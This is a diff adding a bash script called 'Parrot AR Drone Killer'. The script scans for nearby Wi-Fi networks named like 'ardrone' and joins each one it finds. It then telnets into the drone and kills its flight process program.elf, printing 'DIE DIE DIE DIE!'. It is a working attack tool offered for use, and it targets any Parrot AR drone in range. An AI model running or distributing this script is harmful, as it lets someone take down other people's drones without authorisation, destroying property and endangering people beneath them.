@@ -1,5 +1,75 @@
 #!/bin/bash
 
-sudo service hostapd stop
-sudo service dnsmasq stop
-"/home/Lavanoid/bin/DroneKiller" wlan0 30 192.168.1.1 192.168.1.4
+NONE='\033[00m'
+RED='\033[01;31m'
+GREEN='\033[01;32m'
+YELLOW='\033[01;33m'
+PURPLE='\033[01;35m'
+CYAN='\033[01;36m'
+WHITE='\033[01;37m'
+BOLD='\033[1m'
+UNDERLINE='\033[4m'
+
+if [[ $1 == "" ]]; then
+	echo -e "${RED}No argument specified!${NONE} Use --help for usage information."
+	exit 1
+fi
+if [[ $1 == "--help" ]]; then
+	echo
+	echo ------------------------------------------------------------------
+	echo Parrot AR Drone Killer, written by Jack Davies \(Lavanoid Volcanic\)
+	echo -e	"Concept by ${RED}Hak5${NONE} Darren Kitchen."
+	echo
+	echo DroneKiller [INTERFACE] [DELAY \(SECONDS\)] [DRONE IP] [STATIC IP]
+	echo
+	echo ARGUMENTS MUST BE IN THIS ORDER!
+	echo
+	echo Example:
+	echo
+	echo DroneKiller wlan1 60 192.168.1.1 192.168.1.4
+	echo
+	echo The delay is how long the script should sleep before re-scanning
+	echo for drones.
+	echo
+	exit
+fi
+if [[ $4 == "" ]]; then
+        echo -e "${RED}Not enough arguments specified!${NONE} Use --help for usage information."
+        exit 1
+fi
+echo -e "${YELLOW}Scanning for drones...${NONE}"
+while true; do
+	sudo iwlist $1 scan | grep ESSID | grep ardrone | while read -r ssid ; do
+		ssid=`echo ${ssid: 7}`
+		ssid=`echo ${ssid%?}`
+		echo -e "${YELLOW}Drone found! SSID: \"$ssid\". Connecting...${NONE}"
+		sudo iwconfig $1 essid "$ssid"
+		sleep 2
+		echo -e "${YELLOW}Testing wireless association...${NONE}"
+		if [[ `iwconfig $1 | grep "$ssid"` == "" ]]; then
+			echo -e "${RED}Failed to associate with the AP!${NONE}"
+		else
+			echo -e "${GREEN}Association successful. Setting static IP address...${NONE}"
+			sudo ifconfig $1 $4 netmask 255.255.255.0 up
+			sleep 2
+			echo -E "${YELLOW}Testing IP connection...${NONE}"
+			if [[ `ping -c2 $3 | grep 'from'` == "" ]]; then
+				echo -e "${RED}IP connection failed.${NONE}"
+			else
+				echo -e "${GREEN}IP connection successful. Killing via Telnet...${NONE}"
+				empty -f -i /tmp/drone_input.fifo -o /tmp/drone_output.fifo -p /tmp/drone_empty.pid telnet $3
+				empty -w -i /tmp/drone_output.fifo -o /tmp/drone_input.fifo BusyBox "kill -KILL \`pidof program.elf\`\n"
+				kill `pidof empty`
+				if [[ -f "/tmp/drone_output.fifo" ]]; then
+					rm -f "/tmp/drone_output.fifo"
+					rm -f "/tmp/drone_input.fifo"
+					rm -f "/tmp/drone_empty.pid"
+				fi
+				echo
+				echo -e "${GREEN}Kill command sent! DIE DIE DIE DIE!${NONE}"
+				echo
+			fi
+		fi
+	done
+	sleep $2
+done
